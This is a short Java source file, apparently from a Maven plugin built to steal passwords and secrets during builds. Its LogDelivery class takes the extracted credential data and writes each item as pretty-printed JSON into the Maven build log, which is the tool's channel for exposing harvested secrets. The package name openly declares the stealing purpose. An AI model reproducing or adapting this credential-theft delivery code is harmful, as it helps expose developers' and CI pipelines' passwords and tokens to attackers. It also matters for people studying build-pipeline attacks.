package ninja.stealing.maven.password.delivery;

import java.util.List;

import org.apache.maven.plugin.logging.Log;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;

import ninja.stealing.maven.password.model.Extraction;

public class LogDelivery implements Delivery {
	private Log log;
	
	public LogDelivery(Log log) {
		this.log = log;
		
	}
	
	@Override
	public void deliver(List<Extraction> extractions) {
		ObjectMapper mapper = new ObjectMapper();
		log.info("Delivering extraction trought log");
		for (Extraction extraction: extractions) {
			log.info("Extraction: " + extraction.getExtractorId());
			String json = "";
			 try {
				json = mapper.writerWithDefaultPrettyPrinter().writeValueAsString(extraction.getContent());
			} catch (JsonProcessingException e) {
				json = "Can't process json";
			}
			log.info("  - Content: " + json);

		}

	}

}
